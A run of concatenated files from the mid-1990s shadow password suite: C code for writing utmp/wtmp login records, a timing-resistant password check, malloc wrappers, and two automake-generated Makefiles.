		memset((void *) &utent, 0, sizeof utent);
		utent.ut_type = LOGIN_PROCESS;
		utent.ut_pid = pid;
		strncpy(utent.ut_line, line, sizeof utent.ut_line);
		/* XXX - assumes /dev/tty?? */
		strncpy(utent.ut_id, utent.ut_line + 3, sizeof utent.ut_id);
		strncpy(utent.ut_user, "LOGIN", sizeof utent.ut_user);
		time(&utent.ut_time);
	}
#elif defined(LOGIN_PROCESS)
	if (picky) {
#if HAVE_UTMPX_H
		while (utx = getutxent ())
			if (utx->ut_pid == pid)
				break;

		if (utx)
			utxent = *utx;
#endif
		while ((ut = getutent ()))
			if (ut->ut_pid == pid)
				break;

		if (ut)
			utent = *ut;

#if HAVE_UTMPX_H
		endutxent ();
#endif
		endutent ();

		if (! ut) {
 			(void) puts (NO_UTENT);
			exit (1);
		}
#ifndef	UNIXPC

		/*
		 * If there is no ut_line value in this record, fill
		 * it in by getting the TTY name and stuffing it in
		 * the structure.  The UNIX/PC is broken in this regard
		 * and needs help ...
		 */

		if (utent.ut_line[0] == '\0')
#endif	/* !UNIXPC */
		{
			if (! (line = ttyname (0))) {
				(void) puts (NO_TTY);
				exit (1);
			}
			if (strncmp (line, "/dev/", 5) == 0)
				line += 5;
			(void) strncpy (utent.ut_line, line,
					(int) sizeof utent.ut_line);
#if HAVE_UTMPX_H
			(void) strncpy (utxent.ut_line, line,
					(int) sizeof utxent.ut_line);
#endif
		}
	} else {
		if (! (line = ttyname (0))) {
			puts (NO_TTY);
			exit (1);
		}
		if (strncmp (line, "/dev/", 5) == 0)
			line += 5;

 		(void) strncpy (utent.ut_line, line,
  						(int) sizeof utent.ut_line);
		if ((ut = getutline (&utent)))
 			(void) strncpy (utent.ut_id, ut->ut_id,
 					(int) sizeof ut->ut_id);

		(void) strcpy (utent.ut_user, "LOGIN");
		utent.ut_pid = getpid ();
		utent.ut_type = LOGIN_PROCESS;
		(void) time (&utent.ut_time);
#if HAVE_UTMPX_H
		if ((utx = getutxline (&utent)))
			(void) strncpy (utxent.ut_id, utent.ut_id,
					(int) sizeof utxent.ut_id);

		(void) strncpy (utxent.ut_user, utent.ut_user,
			sizeof utent.ut_user);
		utxent.ut_pid = utent.ut_pid;
		utxent.ut_type = utent.ut_type;
		(void) gettimeofday ((struct timeval *) &utxent.ut_tv, 0);
		utent.ut_time = utxent.ut_tv.tv_sec;
#endif
	}
#else	/* !USG */

	/*
	 * Hand-craft a new utmp entry.
	 */

	bzero((char *)&utent, sizeof utent);
	if (! (line = ttyname (0))) {
		puts (NO_TTY);
		exit (1);
	}
	if (strncmp (line, "/dev/", 5) == 0)
		line += 5;

	(void) strncpy (utent.ut_line, line, sizeof utent.ut_line);
	(void) time (&utent.ut_time);
#endif	/* !USG */
}

/*
 * setutmp - put a USER_PROCESS entry in the utmp file
 *
 *	setutmp changes the type of the current utmp entry to
 *	USER_PROCESS.  the wtmp file will be updated as well.
 */

void
setutmp (name, line)
	const char *name;
	const char *line;
{
#ifdef __linux__
	int fd;

	utent.ut_type = USER_PROCESS;
	strncpy(utent.ut_user, name, sizeof utent.ut_user);
	time(&utent.ut_time);
	/* other fields already filled in by checkutmp above */
	setutent();
	pututline(&utent);
	endutent();
	fd = open(_WTMP_FILE, O_APPEND | O_WRONLY, 0);
	if (fd >= 0) {
		write(fd, (char *) &utent, sizeof utent);
		close(fd);
	}
#elif HAVE_UTMPX_H
	struct	utmp	*utmp, utline;
	struct	utmpx	*utmpx, utxline;
	pid_t	pid = getpid ();
	FILE	*utmpx_fp;
	int	found_utmpx = 0, found_utmp;
	int	fd;

	/*
	 * The canonical device name doesn't include "/dev/"; skip it
	 * if it is already there.
	 */

	if (strncmp (line, "/dev/", 5) == 0)
		line += 5;

	/*
	 * Update utmpx.  We create an empty entry in case there is
	 * no matching entry in the utmpx file.
	 */

	setutxent ();
	setutent ();

	while (utmpx = getutxent ()) {
		if (utmpx->ut_pid == pid) {
			found_utmpx = 1;
			break;
		}
	}
	while (utmp = getutent ()) {
		if (utmp->ut_pid == pid) {
			found_utmp = 1;
			break;
		}
	}

	/*
	 * If the entry matching `pid' cannot be found, create a new
	 * entry with the device name in it.
	 */

	if (! found_utmpx) {
		memset ((void *) &utxline, 0, sizeof utxline);
		strncpy (utxline.ut_line, line, sizeof utxline.ut_line);
		utxline.ut_pid = getpid ();
	} else {
		utxline = *utmpx;
		if (strncmp (utxline.ut_line, "/dev/", 5) == 0) {
			memmove (utxline.ut_line, utxline.ut_line + 5,
				sizeof utxline.ut_line - 5);
			utxline.ut_line[sizeof utxline.ut_line - 5] = '\0';
		}
	}
	if (! found_utmp) {
		memset ((void *) &utline, 0, sizeof utline);
		strncpy (utline.ut_line, utxline.ut_line,
			sizeof utline.ut_line);
		utline.ut_pid = utxline.ut_pid;
	} else {
		utline = *utmp;
		if (strncmp (utline.ut_line, "/dev/", 5) == 0) {
			memmove (utline.ut_line, utline.ut_line + 5,
				sizeof utline.ut_line - 5);
			utline.ut_line[sizeof utline.ut_line - 5] = '\0';
		}
	}

	/*
	 * Fill in the fields in the utmpx entry and write it out.  Do
	 * the utmp entry at the same time to make sure things don't
	 * get messed up.
	 */

	strncpy (utxline.ut_user, name, sizeof utxline.ut_user);
	strncpy (utline.ut_user, name, sizeof utline.ut_user);

	utline.ut_type = utxline.ut_type = USER_PROCESS;

	gettimeofday (&utxline.ut_tv);
	utline.ut_time = utxline.ut_tv.tv_sec;

	strncpy (utxline.ut_host, host, sizeof utxline.ut_host);

	pututxline (&utxline);
	pututline (&utline);

	if ((fd = open (_WTMP_FILE "x", O_WRONLY|O_APPEND)) != -1) {
		write (fd, (void *) &utxline, sizeof utxline);
		close (fd);
	}
	if ((fd = open (_WTMP_FILE, O_WRONLY|O_APPEND)) != -1) {
		write (fd, (void *) &utline, sizeof utline);
		close (fd);
	}

	utxent = utxline;
	utent = utline;
	
#else /* !SVR4 */
	struct	utmp	utmp;
	int	fd;
	int	found = 0;

	if ((fd = open(_UTMP_FILE, O_RDWR)) < 0)
		return;

#if !defined(SUN) && !defined(BSD) && !defined(SUN4)
 	while (!found && read(fd, (char *)&utmp, sizeof utmp) == sizeof utmp) {
 		if (! strncmp (line, utmp.ut_line, (int) sizeof utmp.ut_line))
			found++;
	}
#endif

	if (! found) {

		/*
		 * This is a brand-new entry.  Clear it out and fill it in
		 * later.
		 */

  		(void) bzero((char *)&utmp, sizeof utmp);
 		(void) strncpy (utmp.ut_line, line, (int) sizeof utmp.ut_line);
	}

	/*
	 * Fill in the parts of the UTMP entry.  BSD has just the name,
	 * while System V has the name, PID and a type.
	 */

	strncpy(utmp.UT_USER, name, sizeof utent.UT_USER);
#ifdef USER_PROCESS
	utmp.ut_type = USER_PROCESS;
	utmp.ut_pid = getpid ();
#endif

	/*
	 * Put in the current time (common to everyone)
	 */

	(void) time (&utmp.ut_time);

#ifdef UT_HOST
	/*
	 * Update the host name field for systems with networking support
	 */

	(void) strncpy (utmp.ut_host, utent.ut_host, (int) sizeof utmp.ut_host);
#endif

	/*
	 * Locate the correct position in the UTMP file for this
	 * entry.
	 */

#ifdef HAVE_TTYSLOT
	(void) lseek (fd, (off_t) (sizeof utmp) * ttyslot (), SEEK_SET);
#else
	if (found)	/* Back up a splot */
		lseek (fd, (off_t) - sizeof utmp, SEEK_CUR);
	else		/* Otherwise, go to the end of the file */
		lseek (fd, (off_t) 0, SEEK_END);
#endif

	/*
	 * Scribble out the new entry and close the file.  We're done
	 * with UTMP, next we do WTMP (which is real easy, put it on
	 * the end of the file.
	 */

	(void) write (fd, (char *) &utmp, sizeof utmp);
	(void) close (fd);

	if ((fd = open (_WTMP_FILE, O_WRONLY|O_APPEND)) >= 0) {
		(void) write (fd, (char *) &utmp, sizeof utmp);
		(void) close (fd);
	}
 	utent = utmp;
#endif /* SVR4 */
}
/*
 * Copyright 1989 - 1993, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <config.h>

#include "rcsid.h"
RCSID("$Id: valid.c,v 1.1.1.1 1996/08/10 07:59:50 marekm Exp $")

#include <sys/types.h>
#include <stdio.h>
#include "prototypes.h"
#include "defines.h"
#include <pwd.h>

/*
 * valid - compare encrypted passwords
 *
 *	Valid() compares the DES encrypted password from the password file
 *	against the password which the user has entered after it has been
 *	encrypted using the same salt as the original.  Entries which do
 *	not have a password file entry have a NULL pw_name field and this
 *	is used to indicate that a dummy salt must be used to encrypt the
 *	password anyway.
 */

int
valid(password, entry)
	const char *password;
	const struct passwd *entry;
{
	char	*encrypt;
	char	*salt;

	/*
	 * Start with blank or empty password entries.  Always encrypt
	 * a password if no such user exists.  Only if the ID exists and
	 * the password is really empty do you return quickly.  This
	 * routine is meant to waste CPU time.
	 */

	if (entry->pw_name && ! entry->pw_passwd[0]) {
		if (! password[0])
			return (1);	/* user entered nothing */
		else
			return (0);	/* user entered something! */
	}

	/*
	 * If there is no entry then we need a salt to use.
	 */

	if (entry->pw_name == (char *) 0 || entry->pw_passwd[0] == '\0')
		salt = "xx";
	else
		salt = entry->pw_passwd;

	/*
	 * Now, perform the encryption using the salt from before on
	 * the users input.  Since we always encrypt the string, it
	 * should be very difficult to determine if the user exists by
	 * looking at execution time.
	 */

	encrypt = pw_encrypt (password, salt);

	/*
	 * One last time we must deal with there being no password file
	 * entry for the user.  We use the pw_name == NULL idiom to
	 * cause non-existent users to not be validated.
	 */

	if (entry->pw_name && strcmp (encrypt, entry->pw_passwd) == 0)
		return (1);
	else
		return (0);
}
/* Replacements for malloc and strdup with error checking.  Too trivial
   to be worth copyrighting :-).  I did that because a lot of code used
   malloc and strdup without checking for NULL pointer, and I like some
   message better than a core dump...  --marekm
   
   Yeh, but.  Remember that bailing out might leave the system in some
   bizarre state.  You really want to put in error checking, then add
   some back-out failure recovery code. -- jfh */

#include <config.h>

#include "rcsid.h"
RCSID("$Id: xmalloc.c,v 1.1.1.1 1996/08/10 07:59:50 marekm Exp $")

#include <stdio.h>

#include "defines.h"

extern char *malloc();

char *
xmalloc(size)
	unsigned size;
{
	char *ptr;

	ptr = malloc(size);
	if (!ptr && size) {
		fprintf(stderr, "malloc(%u) failed\n", size);
		exit(13);
	}
	return ptr;
}

char *
xstrdup(str)
	const char *str;
{
	return strcpy(xmalloc(strlen(str) + 1), str);
}
# Generated automatically from Makefile.in by configure.
# Makefile.in generated automatically by automake 1.0 from Makefile.am

# Copyright (C) 1994, 1995, 1996 Free Software Foundation, Inc.
# This Makefile.in is free software; the Free Software Foundation
# gives unlimited permission to copy, distribute and modify it.


SHELL = /bin/sh

srcdir = .
top_srcdir = ..
prefix = /usr
exec_prefix = 

bindir = ${exec_prefix}/bin
sbindir = ${exec_prefix}/sbin
libexecdir = ${exec_prefix}/libexec
datadir = ${prefix}/share
sysconfdir = ${prefix}/etc
sharedstatedir = ${prefix}/com
localstatedir = ${prefix}/var
libdir = ${exec_prefix}/lib
infodir = ${prefix}/info
mandir = ${prefix}/man
includedir = ${prefix}/include
oldincludedir = /usr/include

pkgdatadir = $(datadir)/shadow
pkglibdir = $(libdir)/shadow
pkgincludedir = $(includedir)/shadow

top_builddir = ..

INSTALL = /usr/bin/ginstall -c
INSTALL_PROGRAM = ${INSTALL}
INSTALL_DATA = ${INSTALL} -m 644
INSTALL_SCRIPT = @INSTALL_SCRIPT@
transform = s,x,x,

AUTOMAKE_OPTIONS = 1.0 foreign

noinst_LIBRARIES = misc

libdir = ${prefix}/lib

INCLUDES = -I$(top_srcdir)/lib

misc_SOURCES = addgrps.c age.c basename.c chkname.c chowndir.c chowntty.c \
 console.c copydir.c entry.c env.c failure.c fields.c hushed.c \
 isexpired.c limits.c list.c log.c login_access.c login_desrpc.c \
 login_krb.c loginprompt.c mail.c motd.c obscure.c pwd2spwd.c rlogin.c \
 salt.c setugid.c setup.c setupenv.c shell.c strtoday.c suauth.c \
 sub.c sulog.c ttytype.c tz.c ulimit.c utmp.c valid.c xmalloc.c
mkinstalldirs = $(top_srcdir)/mkinstalldirs
CONFIG_HEADER = ../config.h
LIBRARIES = $(noinst_LIBRARIES)

noinst_LIBFILES = libmisc.a

CC = gcc
LEX = @LEX@
YACC = @YACC@

DEFS = -DHAVE_CONFIG_H -I. -I$(srcdir) -I..
CPPFLAGS = 
CFLAGS = -O2 -Wall
LDFLAGS = -s
LIBS = 

COMPILE = $(CC) -c $(DEFS) $(INCLUDES) $(CPPFLAGS) $(CFLAGS)
LINK = $(CC) $(LDFLAGS) -o $@
misc_LIBADD =
misc_OBJECTS = addgrps.o age.o basename.o chkname.o chowndir.o \
chowntty.o console.o copydir.o entry.o env.o failure.o fields.o \
hushed.o isexpired.o limits.o list.o log.o login_access.o \
login_desrpc.o login_krb.o loginprompt.o mail.o motd.o obscure.o \
pwd2spwd.o rlogin.o salt.o setugid.o setup.o setupenv.o shell.o \
strtoday.o suauth.o sub.o sulog.o ttytype.o tz.o ulimit.o utmp.o \
valid.o xmalloc.o
EXTRA_misc_SOURCES =
LIBFILES =  libmisc.a
AR = ar
RANLIB = ranlib
DIST_COMMON = Makefile.am Makefile.in


PACKAGE = shadow
VERSION = 961025

DISTFILES = $(DIST_COMMON) $(SOURCES) $(BUILT_SOURCES) $(HEADERS) \
	$(TEXINFOS) $(INFOS) $(MANS) $(EXTRA_DIST) $(DATA)
DEP_DISTFILES = $(DIST_COMMON) $(SOURCES) $(BUILT_SOURCES) $(HEADERS) \
	$(TEXINFOS) $(INFO_DEPS) $(MANS) $(EXTRA_DIST) $(DATA)

TAR = tar
SOURCES = $(misc_SOURCES)
OBJECTS = $(misc_OBJECTS)

default: all



mostlyclean-noinstLIBRARIES:

clean-noinstLIBRARIES:
	rm -f $(noinst_LIBFILES)

distclean-noinstLIBRARIES:

maintainer-clean-noinstLIBRARIES:

.c.o:
	$(COMPILE) $<

mostlyclean-compile:
	rm -f *.o core

clean-compile:

distclean-compile:
	rm -f *.tab.c

maintainer-clean-compile:
$(misc_OBJECTS): ../config.h

libmisc.a: $(misc_OBJECTS) $(misc_LIBADD)
	rm -f libmisc.a
	$(AR) cru libmisc.a $(misc_OBJECTS) $(misc_LIBADD)
	$(RANLIB) libmisc.a

ID: $(HEADERS) $(SOURCES)
	here=`pwd` && cd $(srcdir) && mkid -f$$here/ID $(SOURCES) $(HEADERS)

tags: TAGS

TAGS: $(HEADERS) $(SOURCES) $(TAGS_DEPENDENCIES)
	here=`pwd` && cd $(srcdir) && etags $(ETAGS_ARGS) $(SOURCES) $(HEADERS) -o $$here/TAGS

mostlyclean-tags:

clean-tags:

distclean-tags:
	rm -f TAGS ID

maintainer-clean-tags:

subdir = libmisc
distdir = $(top_builddir)/$(PACKAGE)-$(VERSION)/$(subdir)
distdir: $(DEP_DISTFILES)
	@for file in `cd $(srcdir) && echo $(DISTFILES)`; do \
	  test -f $(distdir)/$$file \
	  || ln $(srcdir)/$$file $(distdir)/$$file 2> /dev/null \
	  || cp -p $(srcdir)/$$file $(distdir)/$$file; \
	done
addgrps.o: addgrps.c ../lib/defines.h ../lib/rcsid.h
age.o: age.c ../lib/prototypes.h ../lib/faillog.h ../lib/defines.h \
 ../lib/rcsid.h
basename.o: basename.c ../lib/rcsid.h ../lib/defines.h
chkname.o: chkname.c ../lib/rcsid.h ../lib/defines.h
chowndir.o: chowndir.c ../lib/rcsid.h ../lib/defines.h
chowntty.o: chowntty.c ../lib/rcsid.h ../lib/prototypes.h \
 ../lib/faillog.h ../lib/defines.h ../lib/getdef.h
console.o: console.c ../lib/defines.h ../lib/getdef.h ../lib/rcsid.h
copydir.o: copydir.c ../lib/rcsid.h ../lib/prototypes.h \
 ../lib/faillog.h ../lib/defines.h
entry.o: entry.c ../lib/rcsid.h ../lib/prototypes.h ../lib/faillog.h \
 ../lib/defines.h
env.o: env.c ../lib/rcsid.h ../lib/defines.h
failure.o: failure.c ../lib/rcsid.h ../lib/defines.h ../lib/faillog.h \
 ../lib/getdef.h
fields.o: fields.c ../lib/rcsid.h
hushed.o: hushed.c ../lib/rcsid.h ../lib/defines.h
isexpired.o: isexpired.c ../lib/prototypes.h ../lib/faillog.h \
 ../lib/defines.h ../lib/rcsid.h
limits.o: limits.c ../lib/rcsid.h ../lib/prototypes.h ../lib/faillog.h \
 ../lib/defines.h ../lib/getdef.h
list.o: list.c ../lib/rcsid.h ../lib/prototypes.h ../lib/faillog.h \
 ../lib/defines.h
log.o: log.c ../lib/rcsid.h ../lib/defines.h
login_access.o: login_access.c ../lib/rcsid.h
login_desrpc.o: login_desrpc.c
login_krb.o: login_krb.c
loginprompt.o: loginprompt.c ../lib/rcsid.h ../lib/prototypes.h \
 ../lib/faillog.h ../lib/defines.h ../lib/getdef.h
mail.o: mail.c ../lib/defines.h ../lib/getdef.h ../lib/rcsid.h
motd.o: motd.c ../lib/rcsid.h ../lib/defines.h
obscure.o: obscure.c ../lib/rcsid.h ../lib/prototypes.h \
 ../lib/faillog.h ../lib/defines.h ../lib/getdef.h
pwd2spwd.o: pwd2spwd.c ../lib/rcsid.h ../lib/prototypes.h \
 ../lib/faillog.h ../lib/defines.h
rlogin.o: rlogin.c ../lib/rcsid.h ../lib/prototypes.h ../lib/faillog.h \
 ../lib/defines.h
salt.o: salt.c ../lib/rcsid.h ../lib/prototypes.h ../lib/faillog.h \
 ../lib/defines.h ../lib/md5.h ../lib/getdef.h
setugid.o: setugid.c ../lib/rcsid.h ../lib/prototypes.h \
 ../lib/faillog.h ../lib/defines.h ../lib/getdef.h
setup.o: setup.c ../lib/rcsid.h ../lib/prototypes.h ../lib/faillog.h \
 ../lib/defines.h
setupenv.o: setupenv.c ../lib/rcsid.h ../lib/prototypes.h \
 ../lib/faillog.h ../lib/defines.h ../lib/getdef.h
shell.o: shell.c ../lib/rcsid.h ../lib/prototypes.h ../lib/faillog.h \
 ../lib/defines.h
strtoday.o: strtoday.c ../lib/rcsid.h ../lib/defines.h
suauth.o: suauth.c ../lib/prototypes.h ../lib/faillog.h \
 ../lib/defines.h
sub.o: sub.c ../lib/rcsid.h ../lib/defines.h
sulog.o: sulog.c ../lib/rcsid.h ../lib/defines.h ../lib/getdef.h
ttytype.o: ttytype.c ../lib/rcsid.h ../lib/prototypes.h \
 ../lib/faillog.h ../lib/defines.h
tz.o: tz.c ../lib/rcsid.h ../lib/getdef.h
ulimit.o: ulimit.c ../lib/rcsid.h
utmp.o: utmp.c ../lib/defines.h ../lib/rcsid.h
valid.o: valid.c ../lib/rcsid.h ../lib/prototypes.h ../lib/faillog.h \
 ../lib/defines.h
xmalloc.o: xmalloc.c ../lib/rcsid.h ../lib/defines.h

info:

dvi:

check: all

installcheck:

install-exec: 

install-data: 

install: install-exec install-data all
	@:

uninstall: 

all: $(LIBFILES) Makefile

install-strip:
	$(MAKE) INSTALL_PROGRAM='$(INSTALL_PROGRAM) -s' install
installdirs:


mostlyclean-generic:
	test -z "$(MOSTLYCLEANFILES)" || rm -f $(MOSTLYCLEANFILES)

clean-generic:
	test -z "$(CLEANFILES)" || rm -f $(CLEANFILES)

distclean-generic:
	rm -f Makefile $(DISTCLEANFILES)
	rm -f config.cache config.log $(CONFIG_HEADER) stamp-h

maintainer-clean-generic:
	test -z "$(MAINTAINERCLEANFILES)" || rm -f $(MAINTAINERCLEANFILES)
	test -z "$(BUILT_SOURCES)" || rm -f $(BUILT_SOURCES)
mostlyclean:  mostlyclean-noinstLIBRARIES mostlyclean-compile \
		mostlyclean-tags mostlyclean-generic

clean:  clean-noinstLIBRARIES clean-compile clean-tags clean-generic \
		mostlyclean 

distclean:  distclean-noinstLIBRARIES distclean-compile distclean-tags \
		distclean-generic clean 
	rm -f config.status

maintainer-clean:  maintainer-clean-noinstLIBRARIES \
		maintainer-clean-compile maintainer-clean-tags \
		maintainer-clean-generic distclean 
	@echo "This command is intended for maintainers to use;"
	@echo "it deletes files that may require special tools to rebuild."

.PHONY: default mostlyclean-noinstLIBRARIES distclean-noinstLIBRARIES \
clean-noinstLIBRARIES maintainer-clean-noinstLIBRARIES \
mostlyclean-compile distclean-compile clean-compile \
maintainer-clean-compile tags mostlyclean-tags distclean-tags \
clean-tags maintainer-clean-tags distdir info dvi check installcheck \
install-exec install-data install uninstall all installdirs \
mostlyclean-generic distclean-generic clean-generic \
maintainer-clean-generic clean mostlyclean distclean maintainer-clean

.SUFFIXES:
.SUFFIXES: .c .o

# Tell versions [3.59,3.63) of GNU make to not export all variables.
# Otherwise a system limit (for SysV at least) may be exceeded.
.NOEXPORT:
# Makefile.in generated automatically by automake 1.0 from Makefile.am

# Copyright (C) 1994, 1995, 1996 Free Software Foundation, Inc.
# This Makefile.in is free software; the Free Software Foundation
# gives unlimited permission to copy, distribute and modify it.


SHELL = /bin/sh

srcdir = @srcdir@
top_srcdir = @top_srcdir@
VPATH = @srcdir@
prefix = @prefix@
exec_prefix = @exec_prefix@

bindir = @bindir@
sbindir = @sbindir@
libexecdir = @libexecdir@
datadir = @datadir@
sysconfdir = @sysconfdir@
sharedstatedir = @sharedstatedir@
localstatedir = @localstatedir@
libdir = @libdir@
infodir = @infodir@
mandir = @mandir@
includedir = @includedir@
oldincludedir = /usr/include

pkgdatadir = $(datadir)/@PACKAGE@
pkglibdir = $(libdir)/@PACKAGE@
pkgincludedir = $(includedir)/@PACKAGE@

top_builddir = ..

INSTALL = @INSTALL@
INSTALL_PROGRAM = @INSTALL_PROGRAM@
INSTALL_DATA = @INSTALL_DATA@
INSTALL_SCRIPT = @INSTALL_SCRIPT@
transform = @program_transform_name@

AUTOMAKE_OPTIONS = 1.0 foreign

noinst_HEADERS = defines.h dialup.h faillog.h getdef.h \
 groupio.h md5.h port.h prototypes.h \
 pwauth.h pwio.h rcsid.h sgroupio.h shadowio.h

# These files are unneeded for some reason, listed in
# order of appearance:
#
# sources which are not really needed (are they in libc???)
# sources for dbm support (not yet used)
# sources for LIBOBJS (which are normally in libc)
# sources for CRYPTOBJS
# misc header sources

EXTRA_DIST = \
grent.c pwent.c \
\
grdbm.c gsdbm.c pwdbm.c spdbm.c \
grpack.c gspack.c pwpack.c sppack.c \
\
mkdir.c rename.c rmdir.c strdup.c strstr.c \
putgrent.c putpwent.c putspent.c \
sgetgrent.c sgetpwent.c sgetspent.c \
\
md5.c md5crypt.c \
\
gshadow_.h shadow_.h lastlog_.h

# We build libshadow for our tools.

noinst_LIBRARIES = shadow

shadow_SOURCES = commonio.c dialchk.c dialup.c encrypt.c fputsx.c \
 getdef.c getpass.c groupio.c gshadow.c lockpw.c port.c \
 pwauth.c pwio.c rad64.c sgroupio.c shadow.c shadowio.c utent.c

shadow_LIBADD = @LIBOBJS@ @CRYPTOBJS@

INCLUDES = -I$(top_srcdir)/lib
mkinstalldirs = $(top_srcdir)/mkinstalldirs
CONFIG_HEADER = ../config.h
LIBRARIES = $(noinst_LIBRARIES)

noinst_LIBFILES = libshadow.a

CC = @CC@
LEX = @LEX@
YACC = @YACC@

DEFS = @DEFS@ -I. -I$(srcdir) -I..
CPPFLAGS = @CPPFLAGS@
CFLAGS = @CFLAGS@
LDFLAGS = @LDFLAGS@
LIBS = @LIBS@

COMPILE = $(CC) -c $(DEFS) $(INCLUDES) $(CPPFLAGS) $(CFLAGS)
LINK = $(CC) $(LDFLAGS) -o $@
shadow_OBJECTS = commonio.o dialchk.o dialup.o encrypt.o fputsx.o \
getdef.o getpass.o groupio.o gshadow.o lockpw.o port.o pwauth.o pwio.o \
rad64.o sgroupio.o shadow.o shadowio.o utent.o
EXTRA_shadow_SOURCES =
LIBFILES =  libshadow.a
AR = ar
RANLIB = @RANLIB@
HEADERS = $(noinst_HEADERS)

DIST_COMMON = Makefile.am Makefile.in


PACKAGE = @PACKAGE@
VERSION = @VERSION@

DISTFILES = $(DIST_COMMON) $(SOURCES) $(BUILT_SOURCES) $(HEADERS) \
	$(TEXINFOS) $(INFOS) $(MANS) $(EXTRA_DIST) $(DATA)
DEP_DISTFILES = $(DIST_COMMON) $(SOURCES) $(BUILT_SOURCES) $(HEADERS) \
	$(TEXINFOS) $(INFO_DEPS) $(MANS) $(EXTRA_DIST) $(DATA)

TAR = tar
SOURCES = $(shadow_SOURCES)
OBJECTS = $(shadow_OBJECTS)

default: all


$(srcdir)/Makefile.in: Makefile.am $(top_srcdir)/configure.in
	cd $(top_srcdir) && automake $(subdir)/Makefile

Makefile: $(top_builddir)/config.status Makefile.in
	cd $(top_builddir) && CONFIG_FILES=$(subdir)/$@ CONFIG_HEADERS= ./config.status

mostlyclean-noinstLIBRARIES:

clean-noinstLIBRARIES:
	rm -f $(noinst_LIBFILES)

distclean-noinstLIBRARIES:

maintainer-clean-noinstLIBRARIES:

.c.o:
	$(COMPILE) $<

mostlyclean-compile:
	rm -f *.o core

clean-compile:

distclean-compile:
	rm -f *.tab.c

maintainer-clean-compile:
$(shadow_OBJECTS): ../config.h

libshadow.a: $(shadow_OBJECTS) $(shadow_LIBADD)
	rm -f libshadow.a
	$(AR) cru libshadow.a $(shadow_OBJECTS) $(shadow_LIBADD)
	$(RANLIB) libshadow.a

ID: $(HEADERS) $(SOURCES)
	here=`pwd` && cd $(srcdir) && mkid -f$$here/ID $(SOURCES) $(HEADERS)

tags: TAGS

TAGS: $(HEADERS) $(SOURCES) $(TAGS_DEPENDENCIES)
	here=`pwd` && cd $(srcdir) && etags $(ETAGS_ARGS) $(SOURCES) $(HEADERS) -o $$here/TAGS

mostlyclean-tags:

clean-tags:

distclean-tags:
	rm -f TAGS ID

maintainer-clean-tags:

subdir = lib
distdir = $(top_builddir)/$(PACKAGE)-$(VERSION)/$(subdir)
distdir: $(DEP_DISTFILES)
	@for file in `cd $(srcdir) && echo $(DISTFILES)`; do \
	  test -f $(distdir)/$$file \
	  || ln $(srcdir)/$$file $(distdir)/$$file 2> /dev/null \
	  || cp -p $(srcdir)/$$file $(distdir)/$$file; \
	done
commonio.o: commonio.c rcsid.h prototypes.h faillog.h defines.h
dialchk.o: dialchk.c rcsid.h prototypes.h faillog.h defines.h dialup.h
dialup.o: dialup.c rcsid.h prototypes.h faillog.h defines.h dialup.h
encrypt.o: encrypt.c rcsid.h prototypes.h faillog.h defines.h
fputsx.o: fputsx.c defines.h rcsid.h
getdef.o: getdef.c rcsid.h prototypes.h faillog.h defines.h
getpass.o: getpass.c rcsid.h defines.h
groupio.o: groupio.c rcsid.h prototypes.h faillog.h defines.h \
 groupio.h
gshadow.o: gshadow.c
lockpw.o: lockpw.c rcsid.h prototypes.h faillog.h defines.h pwio.h \
 shadowio.h
mkdir.o: mkdir.c rcsid.h
port.o: port.c rcsid.h defines.h port.h
putgrent.o: putgrent.c prototypes.h faillog.h defines.h
putpwent.o: putpwent.c rcsid.h defines.h
putspent.o: putspent.c rcsid.h prototypes.h faillog.h defines.h
pwauth.o: pwauth.c rcsid.h prototypes.h faillog.h defines.h pwauth.h \
 getdef.h
pwio.o: pwio.c rcsid.h prototypes.h faillog.h defines.h pwio.h
rad64.o: rad64.c rcsid.h
rename.o: rename.c rcsid.h defines.h
rmdir.o: rmdir.c rcsid.h
sgetgrent.o: sgetgrent.c rcsid.h defines.h
sgetpwent.o: sgetpwent.c rcsid.h defines.h
sgetspent.o: sgetspent.c rcsid.h prototypes.h faillog.h defines.h
sgroupio.o: sgroupio.c rcsid.h prototypes.h faillog.h defines.h \
 sgroupio.h
shadow.o: shadow.c
shadowio.o: shadowio.c rcsid.h prototypes.h faillog.h defines.h \
 shadowio.h
strdup.o: strdup.c defines.h rcsid.h
strstr.o: strstr.c defines.h rcsid.h
utent.o: utent.c

info:

dvi:

check: all

installcheck:

install-exec: 

install-data: 

install: install-exec install-data all
	@:

uninstall: 

all: $(LIBFILES) $(HEADERS) Makefile

install-strip:
	$(MAKE) INSTALL_PROGRAM='$(INSTALL_PROGRAM) -s' install
installdirs:


mostlyclean-generic:
	test -z "$(MOSTLYCLEANFILES)" || rm -f $(MOSTLYCLEANFILES)

clean-generic:
	test -z "$(CLEANFILES)" || rm -f $(CLEANFILES)

distclean-generic:
	rm -f Makefile $(DISTCLEANFILES)
	rm -f config.cache config.log $(CONFIG_HEADER) stamp-h

maintainer-clean-generic:
